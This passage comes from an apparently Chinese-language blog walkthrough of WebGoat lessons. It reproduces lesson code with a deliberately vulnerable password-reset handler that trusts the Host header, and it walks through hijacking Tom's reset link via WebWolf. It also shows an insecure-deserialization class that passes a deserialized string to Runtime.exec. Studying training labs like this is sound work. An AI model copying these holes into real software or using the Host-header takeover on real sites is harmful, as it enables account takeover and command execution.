class="built_in">this</span>.webWolfPort = webWolfPort;</span><br><span class="line">        <span class="built_in">this</span>.webWolfMailURL = webWolfMailURL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/PasswordReset/ForgotPassword/create-password-reset-link&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">sendPasswordResetLink</span><span class="params">(<span class="meta">@RequestParam</span> String email, HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">resetLink</span> <span class="operator">=</span> UUID.randomUUID().toString();</span><br><span class="line"><span class="comment">//        这里先获取一个uuid 用于区分url</span></span><br><span class="line">        ResetLinkAssignment.resetLinks.add(resetLink);</span><br><span class="line"><span class="comment">//        将链接存放进去</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;host&quot;</span>);</span><br><span class="line"><span class="comment">//        获取请求头的host</span></span><br><span class="line">        <span class="keyword">if</span> (ResetLinkAssignment.TOM_EMAIL.equals(email) &amp;&amp; (host.contains(webWolfPort) || host.contains(webWolfHost)))&#123;</span><br><span class="line"><span class="comment">//            如果重置的是tom 的密码 并且host中包含webWolf</span></span><br><span class="line">            ResetLinkAssignment.userToTomResetLink.put(getWebSession().getUserName(), resetLink);</span><br><span class="line"><span class="comment">//            那么就存放到tom的重置url中</span></span><br><span class="line">            fakeClickingLinkEmail(host,resetLink);</span><br><span class="line"><span class="comment">//            这里是模拟tom去点击重置密码</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendMailToUser(email,host,resetLink);</span><br><span class="line"><span class="comment">//              发送邮件出去</span></span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;E-mail can&#x27;t be send. please try again.&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;email.send&quot;</span>).feedbackArgs(email).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendMailToUser</span><span class="params">(String email, String host, String resetLink)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> email.indexOf(<span class="string">&quot;@&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> email.substring(<span class="number">0</span>,index == -<span class="number">1</span> ? email.length(): index);</span><br><span class="line">        <span class="type">PasswordResetEmail</span> <span class="variable">mail</span> <span class="operator">=</span> PasswordResetEmail.builder()</span><br><span class="line">                .title(<span class="string">&quot;Your password reset link&quot;</span>)</span><br><span class="line">                .contents(String.format(ResetLinkAssignment.TEMPLATE,host,resetLink))</span><br><span class="line">                .sender(<span class="string">&quot;password-reset@webgoat-cloud.net&quot;</span>)</span><br><span class="line">                .recipient(username).build();</span><br><span class="line">        <span class="built_in">this</span>.restTemplate.postForEntity(webWolfMailURL,mail,Object.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fakeClickingLinkEmail</span><span class="params">(String host, String resetLink)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HttpHeaders</span> <span class="variable">httpHeaders</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">            <span class="type">HttpEntity</span> <span class="variable">httpEntity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpEntity</span>(httpHeaders);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">RestTemplate</span>().exchange(String.format(<span class="string">&quot;http://%s/PasswordReset/reset/reset-password/%s&quot;</span>,host,resetLink), HttpMethod.GET,httpEntity,Void.class);</span><br><span class="line"><span class="comment">//            这里是模拟tom去点击重置密码</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="resetlink"><a href="#resetlink" class="headerlink" title="resetlink"></a>resetlink</h3><h4 id="PasswordChangeForm"><a href="#PasswordChangeForm" class="headerlink" title="PasswordChangeForm"></a>PasswordChangeForm</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset.resetlink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.NotNull;</span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.Size;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PasswordChangeForm</span> &#123;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="meta">@Size(min = 6,max =10)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String resetLink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914155825580.png" alt="image-20220914155825580"></p>
<p>发送邮件这里可以看到取的是请求头中的host去发送的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914155911808.png" alt="image-20220914155911808"></p>
<p>这里的host跟踪下发现到了 这里</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160122835.png" alt="image-20220914160122835"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160138495.png" alt="image-20220914160138495"></p>
<p>也就是说拼接到了邮件里面去了 还需要注意的是 这里的拼接附带着uuid 也就是说 如果我们拿到这个uuid自然就可以重置别人的密码</p>
<p>这里我们可以跟着走一遍就知道什么原因了 抓一下下面的包</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160426747.png" alt="image-20220914160426747"></p>
<p>更改host为webwolf</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160540114.png" alt="image-20220914160540114"></p>
<p>我们接着跟下去看看</p>
<p>这里的话其实是在模拟tom去手动点击这个email地址</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160722785.png" alt="image-20220914160722785"></p>
<p>这里就可以看到了 这个host是一路跟下来的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160828768.png" alt="image-20220914160828768"></p>
<p>那么就会发送请求到webwolf中去</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914161038589.png" alt="image-20220914161038589"></p>
<p>拿到uuid去更改tom的密码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914161158331.png" alt="image-20220914161158331"></p>
<p>接着去登录tom</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914161228192.png" alt="image-20220914161228192"></p>
<h2 id="secure-passwords"><a href="#secure-passwords" class="headerlink" title="secure_passwords"></a>secure_passwords</h2><h3 id="SecurePasswords"><a href="#SecurePasswords" class="headerlink" title="SecurePasswords"></a>SecurePasswords</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.secure_passwords;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurePasswords</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A7;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;secure-passwords.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SecurePasswordsAssignment"><a href="#SecurePasswordsAssignment" class="headerlink" title="SecurePasswordsAssignment"></a>SecurePasswordsAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.secure_passwords;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.nulabinc.zxcvbn.Strength;</span><br><span class="line"><span class="keyword">import</span> com.nulabinc.zxcvbn.Zxcvbn;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.DecimalFormat;</span><br><span class="line"><span class="keyword">import</span> java.text.DecimalFormatSymbols;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurePasswordsAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;SecurePasswords/assignment&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String password)</span> &#123;</span><br><span class="line">        <span class="type">Zxcvbn</span> <span class="variable">zxcvbn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zxcvbn</span>();</span><br><span class="line"><span class="comment">//        这个是一个开源项目 其中主要是用来判定你的密码强度</span></span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">DecimalFormat</span> <span class="variable">df</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DecimalFormat</span>(<span class="string">&quot;0&quot;</span>, DecimalFormatSymbols.getInstance(Locale.ENGLISH));</span><br><span class="line">        df.setMaximumFractionDigits(<span class="number">340</span>);</span><br><span class="line"><span class="comment">//        这里像是处理小数点的操作</span></span><br><span class="line">        <span class="type">Strength</span> <span class="variable">strength</span> <span class="operator">=</span> zxcvbn.measure(password);</span><br><span class="line"><span class="comment">//      获取password的强度</span></span><br><span class="line">        output.append(<span class="string">&quot;&lt;b&gt;Your Password: *******&lt;/b&gt;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        output.append(<span class="string">&quot;&lt;b&gt;Length: &lt;/b&gt;&quot;</span> + password.length() + <span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        output.append(<span class="string">&quot;&lt;b&gt;Estimated guesses needed to crack your password: &lt;/b&gt;&quot;</span> + df.format(strength.getGuesses()) + <span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        output.append(<span class="string">&quot;&lt;div style=\&quot;float: left;padding-right: 10px;\&quot;&gt;&lt;b&gt;Score: &lt;/b&gt;&quot;</span> + strength.getScore() + <span class="string">&quot;/4 &lt;/div&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strength.getScore() &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            output.append(<span class="string">&quot;&lt;div style=\&quot;background-color:red;width: 200px;border-radius: 12px;float: left;\&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strength.getScore() &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">            output.append(<span class="string">&quot;&lt;div style=\&quot;background-color:orange;width: 200px;border-radius: 12px;float: left;\&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            output.append(<span class="string">&quot;&lt;div style=\&quot;background-color:green;width: 200px;border-radius: 12px;float: left;\&quot;&gt;&amp;nbsp;&lt;/div&gt;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        output.append(<span class="string">&quot;&lt;b&gt;Estimated cracking time: &lt;/b&gt;&quot;</span> + calculateTime((<span class="type">long</span>) strength.getCrackTimeSeconds().getOnlineNoThrottling10perSecond()) + <span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strength.getFeedback().getWarning().length() != <span class="number">0</span>)</span><br><span class="line">            output.append(<span class="string">&quot;&lt;b&gt;Warning: &lt;/b&gt;&quot;</span> + strength.getFeedback().getWarning() + <span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strength.getFeedback().getSuggestions().size() != <span class="number">0</span>) &#123;</span><br><span class="line">            output.append(<span class="string">&quot;&lt;b&gt;Suggestions:&lt;/b&gt;&lt;/br&gt;&lt;ul&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (String sug : strength.getFeedback().getSuggestions()) output.append(<span class="string">&quot;&lt;li&gt;&quot;</span> + sug + <span class="string">&quot;&lt;/li&gt;&quot;</span>);</span><br><span class="line">            output.append(<span class="string">&quot;&lt;/ul&gt;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        output.append(<span class="string">&quot;&lt;b&gt;Score: &lt;/b&gt;&quot;</span> + strength.getScore() + <span class="string">&quot;/4 &lt;/br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strength.getScore() &gt;= <span class="number">4</span>)</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;securepassword-success&quot;</span>).output(output.toString()).build();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;securepassword-failed&quot;</span>).output(output.toString()).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">calculateTime</span><span class="params">(<span class="type">long</span> seconds)</span> &#123;</span><br><span class="line"><span class="comment">//        这里是对时间进行格式化输出</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> (<span class="number">60</span> * s);</span><br><span class="line">        <span class="type">int</span> <span class="variable">hr</span> <span class="operator">=</span> (<span class="number">60</span> * min);</span><br><span class="line">        <span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> (<span class="number">24</span> * hr);</span><br><span class="line">        <span class="type">int</span> <span class="variable">yr</span> <span class="operator">=</span> (<span class="number">365</span> * d);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">years</span> <span class="operator">=</span> seconds / (d) / <span class="number">365</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">days</span> <span class="operator">=</span> (seconds % yr) / (d);</span><br><span class="line">        <span class="type">long</span> <span class="variable">hours</span> <span class="operator">=</span> (seconds % d) / (hr);</span><br><span class="line">        <span class="type">long</span> <span class="variable">minutes</span> <span class="operator">=</span> (seconds % hr) / (min);</span><br><span class="line">        <span class="type">long</span> <span class="variable">sec</span> <span class="operator">=</span> (seconds % min * s);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (years + <span class="string">&quot; years &quot;</span> + days + <span class="string">&quot; days &quot;</span> + hours + <span class="string">&quot; hours &quot;</span> + minutes + <span class="string">&quot; minutes &quot;</span> + sec + <span class="string">&quot; seconds&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914170132735.png" alt="image-20220914170132735"></p>
<h2 id="deserialization"><a href="#deserialization" class="headerlink" title="deserialization"></a>deserialization</h2><h3 id="InsecureDeserialization"><a href="#InsecureDeserialization" class="headerlink" title="InsecureDeserialization"></a>InsecureDeserialization</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDeserialization</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A8;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;insecure-deserialization.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="InsecureDeserializationTask"><a href="#InsecureDeserializationTask" class="headerlink" title="InsecureDeserializationTask"></a>InsecureDeserializationTask</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.dummy.insecure.framework.VulnerableTaskHolder;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;insecure-deserialization.hints.1&quot;, &quot;insecure-deserialization.hints.2&quot;, &quot;insecure-deserialization.hints.3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDeserializationTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/InsecureDeserialization/task&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String token)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        String b64token;</span><br><span class="line">        <span class="type">long</span> before;</span><br><span class="line">        <span class="type">long</span> after;</span><br><span class="line">        <span class="type">int</span> delay;</span><br><span class="line">        b64token = token.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="comment">//        首先替换下token</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(b64token))))&#123;</span><br><span class="line"><span class="comment">//            进行base64解密 并读到输入流中</span></span><br><span class="line">            before = System.currentTimeMillis();</span><br><span class="line"><span class="comment">//            获取执行前时间</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"><span class="comment">//            反序列化开始</span></span><br><span class="line">            <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> VulnerableTaskHolder))&#123;</span><br><span class="line"><span class="comment">//                如果 反序列化对象不属于 VulnerableTaskHolder</span></span><br><span class="line">                <span class="keyword">if</span> (o <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.stringobject&quot;</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.wrongobject&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">            after = System.currentTimeMillis();</span><br><span class="line"><span class="comment">//            接着获取当前的时间</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (InvalidClassException e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.invalidversion&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IllegalArgumentException e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.expired&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.invalidversion&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        delay = (<span class="type">int</span>) (after - before);</span><br><span class="line">        <span class="keyword">if</span> (delay &gt; <span class="number">7000</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (delay &lt; <span class="number">3000</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="VulnerableTaskHolder"><a href="#VulnerableTaskHolder" class="headerlink" title="VulnerableTaskHolder"></a>VulnerableTaskHolder</h4><p>这里相当于写了一个危险类 让我们了解反序列化漏洞</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914201751549.png" alt="image-20220914201751549"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span>  <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span><span class="number">2</span>;</span><br><span class="line">    <span class="keyword">private</span> String taskName;</span><br><span class="line">    <span class="keyword">private</span> String taskAction;</span><br><span class="line">    <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">        <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">        <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;VulnerableTaskHolder [taskName=&quot;</span> + taskName + <span class="string">&quot;, taskAction=&quot;</span> + taskAction + <span class="string">&quot;, requestedExecutionTime=&quot;</span></span><br><span class="line">                + requestedExecutionTime + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        log.info(<span class="string">&quot;restoring task: &#123;&#125;&quot;</span>,taskName);</span><br><span class="line">        log.info(<span class="string">&quot;restoring time: &#123;&#125;&quot;</span>,taskAction);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (requestedExecutionTime != <span class="literal">null</span> &amp;&amp; (requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(<span class="number">10</span>)) || requestedExecutionTime.isAfter(LocalDateTime.now())))&#123;</span><br><span class="line">            log.debug(<span class="built_in">this</span>.toString());</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;outdated&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((taskAction.startsWith(<span class="string">&quot;sleep&quot;</span>) || taskAction.startsWith(<span class="string">&quot;ping&quot;</span>)) &amp;&amp; taskAction.length() &lt; <span class="number">22</span> )&#123;</span><br><span class="line">            log.info(<span class="string">&quot;about to execute: &#123;&#125;&quot;</span>,taskAction);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(taskAction);</span><br><span class="line"><span class="comment">//                这里就是去执行这个命令了 不过我们这里需要延时5秒</span></span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">                <span class="type">String</span>  <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    log.info(line);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                log.error(<span class="string">&quot;IO Exception&quot;</span>,e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里就是一个超级简单的反序列化 写一下反序列化利用链</p>
